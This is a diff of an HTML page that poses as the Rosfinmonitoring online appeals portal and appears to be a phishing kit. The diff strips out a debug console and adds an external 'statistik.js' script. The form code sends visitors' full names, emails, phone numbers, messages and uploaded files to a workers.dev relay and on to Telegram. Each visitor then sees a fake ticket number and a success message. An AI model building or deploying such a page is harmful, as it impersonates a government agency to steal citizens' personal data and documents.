@@ -7,6 +7,10 @@
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <title>Интернет-приемная — Росфинмониторинг</title>
+    
+    <!-- ===== СТАТИСТИКА ===== -->
+    <script src="statistik.js"></script>
+    
     <style>
         * { 
             box-sizing: border-box; 
@@ -484,54 +488,6 @@
                 padding: 14px 20px;
             }
         }
-
-        /* ===== DEBUG ===== */
-        #debugConsole {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: #0f0f1a;
-            color: #4ade80;
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            padding: 10px 16px;
-            max-height: 160px;
-            overflow-y: auto;
-            z-index: 9999;
-            display: none;
-            border-top: 2px solid #e94560;
-            white-space: pre-wrap;
-            word-break: break-all;
-            line-height: 1.5;
-        }
-        #debugConsole.active {
-            display: block;
-        }
-        #debugToggle {
-            position: fixed;
-            bottom: 16px;
-            right: 16px;
-            z-index: 10000;
-            background: #e94560;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 48px;
-            height: 48px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 16px rgba(233, 69, 96, 0.35);
-            display: none;
-            transition: transform 0.2s;
-        }
-        #debugToggle:hover {
-            transform: scale(1.05);
-        }
-        #debugToggle.active {
-            display: block;
-        }
     </style>
 </head>
 <body>
@@ -630,10 +586,6 @@
         </div>
     </div>
 
-    <!-- ===== DEBUG ===== -->
-    <button id="debugToggle">🐞</button>
-    <div id="debugConsole"></div>
-
     <!-- ===== FOOTER ===== -->
     <footer class="footer-profile">
         <div class="footer-container">
@@ -649,31 +601,6 @@
 
     <script>
         (function() {
-            // ===== ДЕБАГ =====
-            const debugConsole = document.getElementById('debugConsole');
-            const debugToggle = document.getElementById('debugToggle');
-
-            if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                debugToggle.classList.add('active');
-            }
-
-            });
-
-            function debugLog(msg, type = 'info') {
-                const colors = { info: '#4ade80', error: '#f87171', warn: '#fbbf24', success: '#60a5fa' };
-                const entry = `[${new Date().toLocaleTimeString()}] ${msg}`;
-                if (debugConsole.classList.contains('active')) {
-                    const line = document.createElement('div');
-                    line.style.color = colors[type] || '#fff';
-                    line.textContent = entry;
-                    debugConsole.appendChild(line);
-                    debugConsole.scrollTop = debugConsole.scrollHeight;
-                }
-                console.log(entry);
-            }
-
-            debugLog('🚀 Страница загружена', 'info');
-
             // ===== КОНСТАНТЫ =====
             const WORKER_URL = 'https://round-band-482a.portal-rosfin.workers.dev';
             const form = document.getElementById('appealForm');
@@ -710,7 +637,6 @@
 
                 selectedFiles = files;
                 updateFileList();
-                debugLog(`✅ Загружено ${files.length} файлов`, 'success');
             });
 
             function updateFileList() {
@@ -746,7 +672,6 @@
             // ===== ОТПРАВКА =====
             form.addEventListener('submit', async function(event) {
                 event.preventDefault();
-                debugLog('📨 Нажата кнопка отправки', 'info');
 
                 const fullName = document.getElementById('fullName').value.trim();
                 const email = document.getElementById('email').value.trim();
@@ -757,21 +682,16 @@
 
                 if (!fullName || !email || !phone || !subject || !message) {
                     alert('⚠️ Заполните все обязательные поля!');
-                    debugLog('❌ Не все поля заполнены', 'error');
                     return;
                 }
                 if (!agreement) {
                     alert('⚠️ Подтвердите согласие на обработку данных!');
-                    debugLog('❌ Не подтверждено согласие', 'error');
                     return;
                 }
                 if (!email.includes('@')) {
                     alert('⚠️ Введите корректный email адрес!');
-                    debugLog(`❌ Невалидный email: ${email}`, 'error');
                     return;
                 }
-
-                debugLog('✅ Валидация пройдена', 'success');
 
                 submitBtn.disabled = true;
                 btnText.classList.add('hidden');
@@ -804,8 +724,6 @@
 
                     text += `\n🕐 Дата и время: ${dateStr}`;
 
-                    debugLog(`📤 Отправка сообщения... (номер: РФМ-ОБ-${ticketNumber})`, 'info');
-
                     // === ОТПРАВКА ТЕКСТА ===
                     const response = await fetch(`${WORKER_URL}/telegram`, {
                         method: 'POST',
@@ -813,44 +731,30 @@
                         body: JSON.stringify({ text: text })
                     });
 
-                    debugLog(`📊 Статус ответа: ${response.status}`, response.ok ? 'success' : 'error');
-
                     if (!response.ok) {
                         const errText = await response.text();
-                        debugLog(`❌ Ошибка от воркера: ${errText}`, 'error');
-                        throw new Error(`Ошибка отправки: ${response.status}`);
+                        throw new Error(`Ошибка отправки: ${response.status} - ${errText}`);
                     }
 
                     // === ОТПРАВКА ФАЙЛОВ ===
                     if (selectedFiles.length > 0) {
-                        debugLog(`📎 Отправка ${selectedFiles.length} файлов...`, 'info');
-
                         for (let file of selectedFiles) {
                             const formData = new FormData();
                             formData.append('file', file);
                             formData.append('caption', `📎 ${file.name}\n👤 ${fullName}\n📋 РФМ-ОБ-${ticketNumber}`);
 
                             try {
-                                const fileResponse = await fetch(`${WORKER_URL}/send-file`, {
+                                await fetch(`${WORKER_URL}/send-file`, {
                                     method: 'POST',
                                     body: formData
                                 });
-
-                                if (fileResponse.ok) {
-                                    debugLog(`✅ Файл "${file.name}" отправлен`, 'success');
-                                } else {
-                                    const err = await fileResponse.text();
-                                    debugLog(`⚠️ Ошибка отправки файла "${file.name}": ${err}`, 'warn');
-                                }
                             } catch (fileErr) {
-                                debugLog(`⚠️ Файл "${file.name}" не отправился: ${fileErr.message}`, 'warn');
+                                console.warn(`Файл "${file.name}" не отправился:`, fileErr);
                             }
                         }
                     }
 
                     // === УСПЕХ ===
-                    debugLog(`✅ Обращение РФМ-ОБ-${ticketNumber} успешно отправлено!`, 'success');
-
                     document.getElementById('ticketNumber').innerText = ticketNumber;
                     successModal.classList.add('active');
                     form.reset();
@@ -860,7 +764,6 @@
                     fileList.innerHTML = '';
 
                 } catch (error) {
-                    debugLog(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, 'error');
                     console.error('❌ Ошибка:', error);
 
                     // Сохраняем локально
@@ -893,15 +796,24 @@
                         fileList.innerHTML = '';
 
                         alert(`✅ Ваше обращение сохранено локально.\nНомер: РФМ-ОБ-${ticketNumber}\nОтправится при восстановлении связи.`);
-                        debugLog(`💾 Обращение сохранено локально: РФМ-ОБ-${ticketNumber}`, 'warn');
                     } catch (localError) {
                         alert(`❌ Ошибка отправки: ${error.message || 'Проверьте интернет'}`);
-                        debugLog(`❌ Не удалось сохранить локально: ${localError.message}`, 'error');
                     }
                 } finally {
                     submitBtn.disabled = false;
                     btnText.classList.remove('hidden');
                     spinner.classList.remove('active');
+                }
+            });
+
+            // ===== МОДАЛЬНОЕ ОКНО =====
+            window.closeModal = function() {
+                successModal.classList.remove('active');
+            };
+
+            successModal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.remove('active');
                 }
             });
 
